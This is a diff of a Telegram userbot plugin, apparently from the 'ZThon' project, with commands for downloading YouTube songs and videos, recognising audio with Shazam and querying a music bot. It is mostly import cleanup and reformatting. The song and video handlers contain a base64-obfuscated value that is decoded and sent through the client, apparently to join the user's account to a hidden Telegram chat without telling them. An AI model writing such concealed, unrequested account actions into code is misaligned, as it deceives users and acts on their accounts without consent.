@@ -1,29 +1,23 @@
-import asyncio
-import glob
 import base64
-import contextlib
 import io
 import os
-import re
-import pathlib
-from time import time
-import requests
 from pathlib import Path
 
 try:
-    from pyquery import PyQuery as pq
+    pass
 except ModuleNotFoundError:
     os.system("pip3 install pyquery")
-    from pyquery import PyQuery as pq
 
 from ShazamAPI import Shazam
-from validators.url import url
+from telethon.errors.rpcerrorlist import (
+    ChatSendMediaForbiddenError,
+    YouBlockedUserError,
+)
 from telethon.tl import types
-from telethon.errors.rpcerrorlist import YouBlockedUserError, ChatSendMediaForbiddenError
 from telethon.tl.functions.contacts import UnblockRequest as unblock
 from telethon.utils import get_attributes
 from urlextract import URLExtract
-from wget import download
+from validators.url import url
 from yt_dlp import YoutubeDL
 from yt_dlp.utils import (
     ContentTooShortError,
@@ -36,15 +30,14 @@ from yt_dlp.utils import (
     XAttrMetadataError,
 )
 
-from ..core import pool
 from ..core.logger import logging
 from ..core.managers import edit_delete, edit_or_reply
-from ..helpers import progress, reply_id
+from ..helpers import reply_id
 from ..helpers.functions import delete_conv, name_dl, song_dl, video_dl, yt_search
-from ..helpers.functions.utube import _mp3Dl, get_yt_video_id, get_ytthumb, ytsearch
+from ..helpers.functions.utube import ytsearch
 from ..helpers.tools import media_type
-from ..helpers.utils import _format, reply_id, _zedutils
-from . import BOTLOG, BOTLOG_CHATID, zedub
+from ..helpers.utils import _format, _zedutils, reply_id
+from . import zedub
 
 BASE_YT_URL = "https://www.youtube.com/watch?v="
 extractor = URLExtract()
@@ -56,7 +49,9 @@ plugin_category = "البحث"
 #                                                             𝙕𝙏𝙝𝙤𝙣
 # =========================================================== #
 SONG_SEARCH_STRING = "<b>╮ جـارِ البحث ؏ـن المقطـٓع الصٓوتـي... 🎧♥️╰</b>"
-SONG_NOT_FOUND = "<b>⎉╎لـم استطـع ايجـاد المطلـوب .. جرب البحث باستخـدام الامـر (.اغنيه)</b>"
+SONG_NOT_FOUND = (
+    "<b>⎉╎لـم استطـع ايجـاد المطلـوب .. جرب البحث باستخـدام الامـر (.اغنيه)</b>"
+)
 SONG_SENDING_STRING = "<b>╮ جـارِ تحميـل المقطـٓع الصٓوتـي... 🎧♥️╰</b>"
 # =========================================================== #
 #                                                             𝙕𝙏𝙝𝙤𝙣
@@ -78,6 +73,7 @@ video_opts = {
     "logtostderr": False,
     "quiet": True,
 }
+
 
 @zedub.zed_cmd(
     pattern="صوتيه(320)?(?:\s|$)([\s\S]*)",
@@ -102,14 +98,16 @@ async def _(event):
         query = reply.message
         query = f"{query} mp3"
     else:
-        return await edit_or_reply(event, "**⎉╎قم باضافـة الاغنيـه للامـر .. بحث + اسـم الاغنيـه**")
+        return await edit_or_reply(
+            event, "**⎉╎قم باضافـة الاغنيـه للامـر .. بحث + اسـم الاغنيـه**"
+        )
     cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    zedevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن المقطـٓع الصٓوتـي... 🎧♥️╰**")
+    zedevent = await edit_or_reply(
+        event, "**╮ جـارِ البحث ؏ـن المقطـٓع الصٓوتـي... 🎧♥️╰**"
+    )
     video_link = await yt_search(str(query))
     if not url(video_link):
-        return await zedevent.edit(
-            f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}"
-        )
+        return await zedevent.edit(f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}")
     cmd = event.pattern_match.group(1)
     q = "320k" if cmd == "320" else "128k"
     song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
@@ -131,9 +129,7 @@ async def _(event):
     except:
         pass
     if not os.path.exists(song_file):
-        return await zedevent.edit(
-            f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}"
-        )
+        return await zedevent.edit(f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}")
     await zedevent.edit("**╮ ❐ جـارِ التحميـل انتظـر قليلاً  ▬▭... 𓅫╰**")
     catthumb = Path(f"{catname}.jpg")
     if not os.path.exists(catthumb):
@@ -155,7 +151,7 @@ async def _(event):
         for files in (catthumb, song_file):
             if files and os.path.exists(files):
                 os.remove(files)
-    except ChatSendMediaForbiddenError as err: # Code By T.me/zzzzl1l
+    except ChatSendMediaForbiddenError as err:  # Code By T.me/zzzzl1l
         await zedevent.edit("**- عـذراً .. الوسـائـط مغلقـه هنـا ؟!**")
         LOGS.error(str(err))
 
@@ -180,14 +176,14 @@ async def _(event):
         query = reply.message
         query = f"{query} mp4"
     else:
-        return await edit_or_reply(event, "**⎉╎قم باضافـة الاغنيـه للامـر .. فيديو + اسـم الفيديـو**")
+        return await edit_or_reply(
+            event, "**⎉╎قم باضافـة الاغنيـه للامـر .. فيديو + اسـم الفيديـو**"
+        )
     cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     zedevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن الفيديـو... 🎧♥️╰**")
     video_link = await yt_search(str(query))
     if not url(video_link):
-        return await zedevent.edit(
-            f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}"
-        )
+        return await zedevent.edit(f"**⎉╎عـذراً .. لـم استطـع ايجـاد** {query}")
     try:
         cat = Get(cat)
         await event.client(cat)
@@ -232,7 +228,7 @@ async def _(event):
         for files in (catthumb, vsong_file):
             if files and os.path.exists(files):
                 os.remove(files)
-    except ChatSendMediaForbiddenError as err: # Code By T.me/zzzzl1l
+    except ChatSendMediaForbiddenError as err:  # Code By T.me/zzzzl1l
         await zedevent.edit("**- عـذراً .. الوسـائـط مغلقـه هنـا ؟!**")
         LOGS.error(str(err))
 
@@ -258,9 +254,7 @@ async def shazamcmd(event):
     delete = False
     flag = event.pattern_match.group(1)
     if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
-        return await edit_delete(
-            event, "**- بالــرد ع مقطـع صـوتي**"
-        )
+        return await edit_delete(event, "**- بالــرد ع مقطـع صـوتي**")
     zedevent = await edit_or_reply(event, "**- جـار تحميـل المقـطع الصـوتي ...**")
     name = "zed.mp3"
     try:
@@ -279,9 +273,7 @@ async def shazamcmd(event):
         track = next(recognize_generator)[1]["track"]
     except Exception as e:
         LOGS.error(e)
-        return await edit_delete(
-            zedevent, f"**- خطـأ :**\n__{e}__"
-        )
+        return await edit_delete(zedevent, f"**- خطـأ :**\n__{e}__")
 
     file = track["images"]["background"]
     title = track["share"]["subject"]
@@ -330,7 +322,7 @@ async def zelzal_song(event):
             await catub(unblock("ROOTMusic_bot"))
             await conv.send_message("/start")
         await conv.send_message(song)
-        hmm = await conv.get_response()
+        await conv.get_response()
         zzz = await event.client.get_messages(chat)
         await zzevent.edit(SONG_SENDING_STRING, parse_mode="html")
         await zzz[0].click(0)
@@ -469,6 +461,7 @@ async def fix_attributes(
         )
     )
     return new_attributes, mime_type
+
 
 """
 @zedub.zed_cmd(
